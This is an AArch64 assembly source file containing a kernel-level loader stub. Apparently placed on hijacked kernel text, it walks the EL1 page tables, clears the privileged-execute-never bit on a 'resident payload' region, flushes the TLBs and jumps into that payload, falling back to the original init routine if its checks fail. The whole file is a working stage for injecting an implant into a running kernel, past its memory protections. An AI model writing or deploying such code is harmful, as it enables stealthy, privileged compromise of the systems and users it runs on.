/*
 * SPDX-License-Identifier: AGPL-3.0-or-later
 */
/* Executed from original RX text, before entering the resident payload. */
.text
.global bootstrap
bootstrap:
    stp x29, x30, [sp, #-32]!
    stp x19, x20, [sp, #16]
    ldr x19, payload_start
    ldr x20, payload_rx_end
    mrs x9, tcr_el1
    ubfx x10, x9, #16, #6
    cmp x10, #16
    b.ne fallback
    ubfx x10, x9, #30, #2
    cmp x10, #2
    b.ne fallback
page:
    mrs x9, ttbr1_el1
    mov x10, #39
level:
    and x9, x9, #0x0000fffffffff000
    mov x11, #0xffff000000000000
    orr x9, x9, x11
    lsr x11, x19, x10
    and x11, x11, #511
    add x12, x9, x11, lsl #3
    ldr x9, [x12]
    and x11, x9, #3
    cmp x11, #3
    b.ne fallback
    cmp x10, #12
    b.eq leaf
    sub x10, x10, #9
    b level
leaf:
    bic x9, x9, #0x20000000000000 /* PXN */
    bic x9, x9, #0x40           /* no EL0 access */
    orr x9, x9, #0x80          /* EL1 read-only: WXN remains enabled */
    str x9, [x12]
    dc cvac, x12
    add x19, x19, #4096
    cmp x19, x20
    b.lo page
    dsb ishst
    tlbi vmalle1is
    dsb ish
    isb
    ldr x16, payload_start
    blr x16
    b done
fallback:
    ldr x16, original_init
    blr x16
done:
    ldp x19, x20, [sp, #16]
    ldp x29, x30, [sp], #32
    ret
.align 3
payload_start: .quad 0x1122334455667788
payload_rx_end: .quad 0x2233445566778899
original_init: .quad 0x33445566778899aa
.section .note.GNU-stack,"",%progbits
